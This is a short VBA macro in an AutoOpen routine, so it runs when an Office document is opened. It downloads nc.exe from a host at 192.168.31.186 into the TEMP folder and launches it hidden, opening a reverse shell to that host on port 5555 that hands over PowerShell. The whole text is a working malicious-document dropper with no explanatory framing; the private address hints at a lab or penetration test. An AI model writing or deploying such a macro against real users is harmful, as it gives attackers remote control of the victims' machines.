Sub AutoOpen()
    Dim strUrl As String
    Dim strPath As String
    strUrl = "http://192.168.31.186:8888/nc.exe"
    strPath = Environ("TEMP") & "\nc.exe"

    With CreateObject("Microsoft.XMLHTTP")
        .Open "GET", strUrl, False
        .Send
        If .Status = 200 Then
            Set oStream = CreateObject("ADODB.Stream")
            oStream.Open
            oStream.Type = 1
            oStream.Write .ResponseBody
            oStream.SaveToFile strPath, 2
            oStream.Close
        End If
    End With

    Shell "cmd.exe /c " & strPath & " 192.168.31.186 5555 -e powershell", vbHide
End Sub